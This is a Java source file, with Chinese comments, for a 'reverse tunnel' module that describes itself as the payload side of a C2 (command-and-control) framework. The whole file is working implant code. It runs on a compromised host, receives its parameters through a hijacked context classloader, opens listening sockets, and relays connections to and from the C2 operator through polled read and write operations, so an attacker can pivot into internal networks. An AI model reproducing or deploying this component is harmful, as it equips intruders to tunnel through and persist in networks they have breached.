package org.leo.core.component;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

/**
 * 反向隧道组件（payload 侧）
 * 在被管理端开 ServerSocket 接受内网客户端连接，再由 C2 通过轮询拉取新连接事件，
 * 把流量经组件 read/write 转发到 C2 侧目标。
 *
 * 操作码：
 *   0 START_LISTEN   - {listenId, listenPort, bindAddr?} → 开监听
 *   1 STOP_LISTEN    - {listenId}                       → 关监听并清理该监听下所有连接
 *   2 ACCEPT         - {listenId}                       → drain 非阻塞 accept，返回 newConns
 *   3 READ           - {connId}                         → 非阻塞读
 *   4 WRITE          - {connId, data}                   → 写
 *   5 CLOSE          - {connId}                         → 关闭单连接
 *   6 LIST_LISTENS   - {}                               → 列出当前所有监听
 *
 * 注意：保持 Java 1.6 语法、无内部类、类型显式。
 */
public class ReverseTunnelComponent implements Runnable {

    private static final int OP_START_LISTEN = 0;
    private static final int OP_STOP_LISTEN  = 1;
    private static final int OP_ACCEPT       = 2;
    private static final int OP_READ         = 3;
    private static final int OP_WRITE        = 4;
    private static final int OP_CLOSE        = 5;
    private static final int OP_LIST_LISTENS = 6;

    private static final int BUFFER_SIZE = 65536;

    // listenId -> ServerSocketChannel
    private static Map listenMap = new ConcurrentHashMap();
    // listenId -> info Map(port, bindAddr)
    private static Map listenInfoMap = new ConcurrentHashMap();
    // connId -> SocketChannel
    private static Map connMap = new ConcurrentHashMap();
    // connId -> listenId（用于停止监听时批量清理）
    private static Map connToListen = new ConcurrentHashMap();
    // connId -> lastActivityMillis（用于 idle 超时清理）
    private static Map connLastActivity = new ConcurrentHashMap();

    private static final long IDLE_TIMEOUT_MS = 10L * 60L * 1000L;

    private HashMap params;
    private HashMap results;

    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }

    public void invoke() throws IOException {
        int op = ((Number) params.get("op")).intValue();
        if (op == OP_START_LISTEN) {
            handleStartListen();
        } else if (op == OP_STOP_LISTEN) {
            handleStopListen();
        } else if (op == OP_ACCEPT) {
            handleAccept();
        } else if (op == OP_READ) {
            handleRead();
        } else if (op == OP_WRITE) {
            handleWrite();
        } else if (op == OP_CLOSE) {
            handleClose();
        } else if (op == OP_LIST_LISTENS) {
            handleListListens();
        } else {
            results.put("code", Integer.valueOf(400));
            results.put("msg", "unknown op: " + op);
        }
    }

    private void handleStartListen() {
        String listenId = (String) params.get("listenId");
        int listenPort = ((Number) params.get("listenPort")).intValue();
        String bindAddr = (String) params.get("bindAddr");
        if (bindAddr == null || bindAddr.length() == 0) {
            bindAddr = "127.0.0.1";
        }
        if (listenId == null || listenId.length() == 0) {
            results.put("code", Integer.valueOf(400));
            results.put("msg", "listenId required");
            return;
        }
        if (listenMap.containsKey(listenId)) {
            results.put("code", Integer.valueOf(400));
            results.put("msg", "listenId already exists");
            return;
        }
        ServerSocketChannel ssc = null;
        try {
            ssc = ServerSocketChannel.open();
            ssc.configureBlocking(false);
            ssc.socket().setReuseAddress(true);
            ssc.socket().bind(new InetSocketAddress(bindAddr, listenPort));
            listenMap.put(listenId, ssc);
            HashMap info = new HashMap();
            info.put("listenId", listenId);
            info.put("listenPort", Integer.valueOf(listenPort));
            info.put("bindAddr", bindAddr);
            listenInfoMap.put(listenId, info);
            results.put("code", Integer.valueOf(200));
            results.put("msg", "listening");
            results.put("listenPort", Integer.valueOf(listenPort));
            results.put("bindAddr", bindAddr);
        } catch (IOException e) {
            try { if (ssc != null) ssc.close(); } catch (IOException ignored) {}
            results.put("code", Integer.valueOf(500));
            results.put("msg", "bind failed: " + e.getMessage());
        }
    }

    private void handleStopListen() {
        String listenId = (String) params.get("listenId");
        ServerSocketChannel ssc = (ServerSocketChannel) listenMap.remove(listenId);
        listenInfoMap.remove(listenId);
        if (ssc == null) {
            results.put("code", Integer.valueOf(404));
            results.put("msg", "listenId not found");
            return;
        }
        try { ssc.close(); } catch (IOException ignored) {}
        // 清理该监听下所有 connId
        int closed = 0;
        Iterator it = connToListen.entrySet().iterator();
        while (it.hasNext()) {
            Map.Entry e = (Map.Entry) it.next();
            if (listenId.equals(e.getValue())) {
                String connId = (String) e.getKey();
                SocketChannel sc = (SocketChannel) connMap.remove(connId);
                connLastActivity.remove(connId);
                if (sc != null) {
                    try { sc.socket().close(); } catch (IOException ignored) {}
                    closed++;
                }
                it.remove();
            }
        }
        results.put("code", Integer.valueOf(200));
        results.put("msg", "stopped");
        results.put("closedConns", Integer.valueOf(closed));
    }

    private void handleAccept() throws IOException {
        sweepIdleConns();
        String listenId = (String) params.get("listenId");
        ServerSocketChannel ssc = (ServerSocketChannel) listenMap.get(listenId);
        if (ssc == null) {
            results.put("code", Integer.valueOf(404));
            results.put("msg", "listenId not found");
            return;
        }
        List newConns = new ArrayList();
        // drain 非阻塞 accept
        while (true) {
            SocketChannel sc = ssc.accept();
            if (sc == null) break;
            sc.configureBlocking(false);
            sc.socket().setTcpNoDelay(true);
            String connId = generateConnId(listenId);
            connMap.put(connId, sc);
            connToListen.put(connId, listenId);
            connLastActivity.put(connId, Long.valueOf(System.currentTimeMillis()));
            HashMap info = new HashMap();
            info.put("connId", connId);
            info.put("clientAddr", sc.socket().getInetAddress() != null
                    ? sc.socket().getInetAddress().getHostAddress() : "");
            info.put("clientPort", Integer.valueOf(sc.socket().getPort()));
            newConns.add(info);
        }
        results.put("code", Integer.valueOf(200));
        results.put("newConns", newConns);
    }

    private void handleRead() throws IOException {
        String connId = (String) params.get("connId");
        SocketChannel sc = (SocketChannel) connMap.get(connId);
        if (sc == null) {
            results.put("code", Integer.valueOf(404));
            results.put("msg", "connId not found");
            return;
        }
        ByteBuffer buf = ByteBuffer.allocate(BUFFER_SIZE);
        int len = sc.read(buf);
        if (len > 0) {
            buf.flip();
            byte[] data = new byte[buf.remaining()];
            buf.get(data);
            connLastActivity.put(connId, Long.valueOf(System.currentTimeMillis()));
            results.put("code", Integer.valueOf(200));
            results.put("bytesRead", Integer.valueOf(data.length));
            results.put("data", data);
        } else if (len == 0) {
            results.put("code", Integer.valueOf(204));
            results.put("bytesRead", Integer.valueOf(0));
            results.put("data", new byte[0]);
        } else {
            try { sc.socket().close(); } catch (IOException ignored) {}
            connMap.remove(connId);
            connToListen.remove(connId);
            connLastActivity.remove(connId);
            results.put("code", Integer.valueOf(404));
            results.put("msg", "peer closed");
        }
    }

    private void handleWrite() throws IOException {
        String connId = (String) params.get("connId");
        SocketChannel sc = (SocketChannel) connMap.get(connId);
        if (sc == null) {
            results.put("code", Integer.valueOf(404));
            results.put("msg", "connId not found");
            return;
        }
        Object dataObj = params.get("data");
        byte[] data = (byte[]) dataObj;
        if (data == null) data = new byte[0];
        ByteBuffer buf = ByteBuffer.wrap(data);
        long deadline = System.currentTimeMillis() + 5000L;
        int written = 0;
        while (buf.hasRemaining()) {
            int n = sc.write(buf);
            if (n > 0) {
                written += n;
                connLastActivity.put(connId, Long.valueOf(System.currentTimeMillis()));
                continue;
            }
            if (System.currentTimeMillis() > deadline) {
                // 写超时：关闭连接，避免 puppet 线程池被卡住
                try { sc.socket().close(); } catch (IOException ignored) {}
                connMap.remove(connId);
                connToListen.remove(connId);
                connLastActivity.remove(connId);
                results.put("code", Integer.valueOf(500));
                results.put("msg", "write timeout");
                results.put("bytesWritten", Integer.valueOf(written));
                return;
            }
            try { Thread.sleep(1); } catch (InterruptedException ignored) {}
        }
        results.put("code", Integer.valueOf(200));
        results.put("bytesWritten", Integer.valueOf(written));
    }

    private void handleClose() {
        String connId = (String) params.get("connId");
        SocketChannel sc = (SocketChannel) connMap.remove(connId);
        connToListen.remove(connId);
        connLastActivity.remove(connId);
        if (sc != null) {
            try { sc.socket().close(); } catch (IOException ignored) {}
        }
        results.put("code", Integer.valueOf(200));
    }

    /**
     * 清理超过 IDLE_TIMEOUT_MS 无活动的连接，防止 C2 侧崩溃后 fd 泄漏。
     * 在 ACCEPT 时触发，低频调用，无需独立定时线程。
     */
    private static void sweepIdleConns() {
        long now = System.currentTimeMillis();
        Iterator it = connLastActivity.entrySet().iterator();
        while (it.hasNext()) {
            Map.Entry e = (Map.Entry) it.next();
            long last = ((Long) e.getValue()).longValue();
            if (now - last > IDLE_TIMEOUT_MS) {
                String connId = (String) e.getKey();
                SocketChannel sc = (SocketChannel) connMap.remove(connId);
                connToListen.remove(connId);
                it.remove();
                if (sc != null) {
                    try { sc.socket().close(); } catch (IOException ignored) {}
                }
            }
        }
    }

    private void handleListListens() {
        List list = new ArrayList();
        Iterator it = listenInfoMap.values().iterator();
        while (it.hasNext()) {
            list.add(it.next());
        }
        results.put("code", Integer.valueOf(200));
        results.put("listens", list);
    }

    private String generateConnId(String listenId) {
        long n = System.nanoTime();
        int r = (int) (Math.random() * 0x7fffffff);
        return listenId + "-" + Long.toHexString(n) + "-" + Integer.toHexString(r);
    }
}
